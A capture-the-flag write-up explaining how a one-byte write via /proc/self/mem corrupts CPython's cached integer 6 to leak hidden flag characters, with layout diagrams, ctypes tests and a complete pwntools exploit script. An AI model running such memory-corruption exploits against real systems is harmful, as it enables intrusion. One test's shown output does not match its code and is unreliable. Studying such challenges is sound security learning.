---
title: "Flag Printer 20XX: corrupting CPython's small integers"
date: 2026-06-19 20:00:00 +0600
series: "AlpacaHack Daily"
platform: "AlpacaHack"
summary: "One byte written through /proc/self/mem changes what the cached integer 6 means, which redirects a string index to the hidden part of the flag."
description: "One byte written through /proc/self/mem changes what the cached integer 6 means, which redirects a string index to the hidden part of the flag."
tags: ["pwn", "python"]
---

<details class="toc" markdown="1">
<summary>Contents</summary>

* TOC
{:toc}

</details>

{% raw %}
## Challenge Overview

We are given a Python server (`server.py`) running on Python 3.14:

```python
flag = "Alpaca{????}"
assert len(flag) == 12

print(f"Hint: {id(0) = }")
mem = open("/proc/self/mem", "wb", buffering=0)
mem.seek(int(input("Offset: ")))
mem.write(bytes.fromhex(input("1-byte (Hex): "))[:1])

for i in range(len("Alpaca{")):
    print(flag[i], end="", flush=True)
```

**What we get:**
- A hint: `id(0)` - the memory address of the integer object `0`
- One arbitrary 1-byte write anywhere in process memory
- The server then prints only `Alpaca{` - the first 7 characters

**Goal:** Leak the 4 hidden characters `????` and the closing `}` to reconstruct the full flag.

## Background Theory

### 1. `id()` and Object Identity in CPython

In CPython, `id(obj)` returns the **memory address** of the object. Every Python object lives at a specific location in memory:

```python
x = 42
print(id(x))  # e.g. 140734835490352
```

### 2. Small Integer Caching

CPython pre-allocates and caches small integer objects. This means there is only **one object** for each small integer in the entire process - they are singletons:

```python
a = 7
b = 7
print(a is b)          # True - same object in memory
print(id(a) == id(b))  # True
```

This is the key vulnerability: when Python evaluates `flag[i]` in a loop, the index `i` **is** the cached integer object. If we corrupt that object's stored value, we redirect the array index to anywhere we want.

### 3. CPython 3.12+ Integer Object Memory Layout

In CPython 3.12+, the integer object structure was redesigned. Each object looks like this in memory:

```
+-----------------------------------+
| ob_refcnt    (8 bytes, offset  +0) |  reference count
+-----------------------------------+
| ob_type      (8 bytes, offset  +8) |  pointer to PyLongObject type
+-----------------------------------+
| lv_tag       (8 bytes, offset +16) |  encodes digit count and sign
+-----------------------------------+
| ob_digit     (4 bytes, offset +24) |  <- actual integer value lives here
+-----------------------------------+
      Total size: 32 bytes
```

Since small integers are allocated sequentially in memory:

```
id(n) = id(0) + n * 32
```

And the address of the **value field** (`ob_digit`) for integer `n` is:

```
addr(n) = id(0) + n * 32 + 24
```

We verified this locally using Docker:

```sh
docker compose run --rm challenge python3 -c "
import ctypes
print('INT_SIZE:', id(1) - id(0))
for n in range(8):
    lv_tag   = ctypes.c_uint64.from_address(id(n) + 16).value
    ob_digit = ctypes.c_uint32.from_address(id(n) + 24).value
    print(f'int {n}: lv_tag={hex(lv_tag)}, ob_digit={ob_digit}')
"
```

Output:
```
INT_SIZE: 32
int 0: lv_tag=0x5, ob_digit=0
int 1: lv_tag=0xc, ob_digit=1
int 2: lv_tag=0xc, ob_digit=2
int 3: lv_tag=0xc, ob_digit=3
int 4: lv_tag=0xc, ob_digit=4
int 5: lv_tag=0xc, ob_digit=5
int 6: lv_tag=0xc, ob_digit=6
int 7: lv_tag=0xc, ob_digit=7
```

### 4. `/proc/self/mem`

On Linux, `/proc/self/mem` is a special virtual file that maps directly to the current process's memory. Writing to it at a specific offset overwrites that memory address:

```python
mem = open("/proc/self/mem", "wb", buffering=0)
mem.seek(target_address)
mem.write(b"\x07")  # write 1 byte
```

The server exposes this as a primitive: we supply the offset and the byte to write.

### 5. How `range()` Stores Its Bound

`range(n)` extracts the value of `n` and stores it as a **C long** internally - not a reference to the Python integer object. So corrupting the integer object `7` does not directly change the range's stop value.

However, the loop **iteration variable** `i` at each step IS the cached integer object. So at step 7, `i` is the integer object `7`. If that object holds value `M`, then `flag[i]` accesses `flag[M]`.

We verified with a local test:

```python
import ctypes

# corrupt int 7 -> 100
ctypes.c_uint32.from_address(id(7) + 24).value = 100

count = 0
for i in range(len('Alpaca{')):
    count += 1
    print(f'iteration {count}, i={i}')
    if count > 15:
        break
```

Output:
```
iteration 1, i=0
iteration 2, i=1
iteration 3, i=2
iteration 4, i=3
iteration 5, i=4
iteration 6, i=5
iteration 100, i=6
total iterations: 100
```

At step 7, `count += 1` used the corrupted integer object `7` (now valued 100), causing `count` to jump to 100. The loop then ran far beyond 7 iterations because the loop's own arithmetic used the corrupted integer objects.

## Exploit Strategy

### The Core Primitive: Index Redirection

By writing byte `M` to `ob_digit` of integer `N`:

- Integer object `N` now holds value `M`
- When the loop reaches iteration N, `flag[N]` becomes `flag[M]`
- The output at position N reveals `flag[M]`

This lets us **redirect any array index** to any position in the flag string.

### The Cleanest Approach: Corrupt Only Integer `6`

I tried to replace `len("Alpaca{")` with `len(Alpaca{????})` but i got out of bound error. Since i am replacing 7 with 12. So after printing `Alpaca{` it tries to print `flag[12]` instead of `flag[7]` which causes `IndexError: string index out of range`

**Better approach:** 

The loop runs iterations i=0 through i=6, printing `flag[0]` - `flag[6]` = `Alpaca{`. The last visible character is always at position 6.

If we corrupt integer `6` → `M`, then at i=6 Python accesses `flag[M]` instead of `flag[6]`. By scanning M from 7 to 11 across separate connections, we reveal every hidden character one at a time.

The last character of each output is `flag[M]` - the hidden character at that index.

```
Normal output:    A l p a c a {
                  0 1 2 3 4 5 6
Corrupted (M=7):  A l p a c a h
                  0 1 2 3 4 5 ^
                               flag[7] = h
Corrupted (M=8):  A l p a c a X
                  0 1 2 3 4 5 ^
                               flag[8] = X
```

This single technique - **corrupt int `6`, scan M from 7 to 11** - is enough to recover the entire hidden portion of the flag.

## Exploit Script

```python
from pwn import *

INT_SIZE  = 32  # CPython 3.12+ integer object size in bytes
DIGIT_OFF = 24  # offset of ob_digit from object start

HOST = "<host>"
PORT = 19629

def query(target_idx, retries=3):
    """
    Corrupt integer `6` to hold value `target_idx`, so that at loop
    iteration i=6, Python accesses flag[target_idx] instead of flag[6].
    Returns the last character of the output = flag[target_idx].
    Retries on empty output to handle network flakiness.
    """
    for attempt in range(retries):
        try:
            conn = remote(HOST, PORT, timeout=10)
            hint = conn.recvline(timeout=10).decode()
            id_0 = int(hint.split("=")[-1].strip())
            # Address of ob_digit for integer 6
            target = id_0 + 6 * INT_SIZE + DIGIT_OFF
            conn.sendlineafter(b"Offset: ", str(target).encode())
            conn.sendlineafter(b"1-byte (Hex): ", f"{target_idx:02x}".encode())
            out = conn.recvall(timeout=10).decode(errors="replace")
            conn.close()
            if out:  # retry if empty due to network flakiness
                return out
        except Exception as e:
            print(f"  [retry {attempt+1}] {e}")
    return None

hidden = {}

# Corrupt int 6 -> M for each hidden index M = 7..11
# The last character of the output reveals flag[M]
for m in range(7, 12):
    out = query(m)
    char = out[-1] if out else '?'
    hidden[m] = char
    print(f"flag[{m}] = {char!r}  (output: {out!r})")

# Assemble the flag
flag = "Alpaca{" + "".join(hidden[i] for i in range(7, 12))
print(f"\nFlag: {flag}")
```

### Script Output

```
flag[7]  = 'h'   (output: 'Alpacah')
flag[8]  = 'X'   (output: 'AlpacaX')
flag[9]  = 'X'   (output: 'AlpacaX')
flag[10] = 'k'   (output: 'Alpacak')
flag[11] = '}'   (output: 'Alpaca}')

Flag: Alpaca{hXXk}
```

## Key Takeaways

| Concept | Role in Exploit |
|---|---|
| `id(0)` hint | Anchor point to calculate all integer object addresses |
| Small int caching | Integer objects are at predictable offsets from `id(0)` |
| CPython 3.12+ layout | `ob_digit` at offset +24, object size = 32 bytes |
| `/proc/self/mem` write | Overwrites `ob_digit` of a cached int object in-place |
| Index redirection | Corrupt int `N` → `M` makes `flag[N]` access `flag[M]` |
| Single target integer | Corrupting only int `6` is sufficient to scan all hidden flag characters |
{% endraw %}
